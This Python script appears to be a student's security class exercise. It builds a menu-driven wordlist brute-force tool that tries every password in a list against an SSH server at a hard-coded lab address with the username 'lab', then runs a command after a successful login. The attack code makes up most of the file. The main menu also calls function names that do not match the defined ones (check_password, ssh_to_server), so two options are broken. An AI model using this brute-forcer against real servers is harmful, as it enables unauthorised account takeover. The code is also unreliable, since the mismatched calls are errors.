#!/bin/python3

#Script: Ops 401 Class 16 Ops Challenge Solution
#Author: Marco Aliaga
#Date of latest revision: 8 May 2023
#Purpose: In Python, modify ch16 to authenticate to an SSH server by its IP address.:
#Mode 1: Offensive; Dictionary Iterator

#Main

# Import libraries
import time, getpass
import paramiko

# Declare functions
def iterator():
    filepath = input("Enter your dictionary filepath:\n")
    #filepath = '/home/osboxes/Desktop/rockyou2.txt' #test filepath
    
    file = open(filepath, encoding="ISO-8859-1") # address encoding problem
    line = file.readline()
    while line:
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)
        line = file.readline()
    file.close()

def checkPssword():
    userIput = getpass.getpass(prompt="Enter the password to check: ")
    filepath = input("Enter the word list file path: ")
    try:
        with open(filepath, "r", encoding="ISO-8859-1") as wordlist:
            words = wordlist.readlines()
            for word in words:
                if userIput == word.strip():
                    print(f"Password found in the word list.")
                    return
        print(f"Password not found in the word list.")
    except FileNotFoundError:
        print(f"File not found at {filepath}")
        
def sshToServer():
    # Define SSH parameters
    hostname = '192.168.0.106'
    port = 22
    username = 'lab'
    filepath = input("Enter the password list file path: ")

    # Try each password until successful login
    with open(filepath, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                # Connect to SSH server
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname, port=port, username=username, password=password)

                # Execute command on remote server
                stdin, stdout, stderr = ssh.exec_command('ls -al')
                print(stdout.read().decode())

                # Close SSH connection and return
                ssh.close()
                print("Successfully logged in to the server!")
                return

            except paramiko.AuthenticationException:
                # Wrong password, try next one
                print(f"Failed to log in with password: {password}")
                continue

    # All passwords failed
    print("All passwords failed, unable to log in to the server.")

# Main
if __name__ == "__main__":
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - SSH to Ubuntu Server
4 - Exit
Please enter a number: 
""")
        if mode == "1":
            iterator()
        elif mode == "2":
            check_password()
        elif mode == "3":
            ssh_to_server()
        elif mode == "4":
            break
        else:
            print("Invalid selection...")
